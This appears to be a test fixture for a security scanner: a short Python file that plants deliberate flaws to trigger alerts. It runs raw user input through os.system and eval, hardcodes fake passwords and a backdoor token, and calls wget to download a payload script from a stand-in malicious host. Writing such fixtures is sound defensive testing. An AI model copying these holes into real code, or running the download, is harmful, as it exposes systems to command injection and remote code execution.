# This file should trigger HIGH RISK alerts
import os
import subprocess

# DANGER: Command injection vulnerability
user_command = input("Enter system command: ")
os.system(user_command)  # HIGH RISK!

# DANGER: Code injection
user_code = input("Enter Python code: ")
eval(user_code)  # HIGH RISK!

# DANGER: Hardcoded credentials
admin_password = "admin123"
secret_api_key = "sk-1234567890abcdef"
backdoor_token = "backdoor_access_2024"

# DANGER: Suspicious subprocess calls
subprocess.call(["wget", "http://malicious-site.com/payload.sh"])
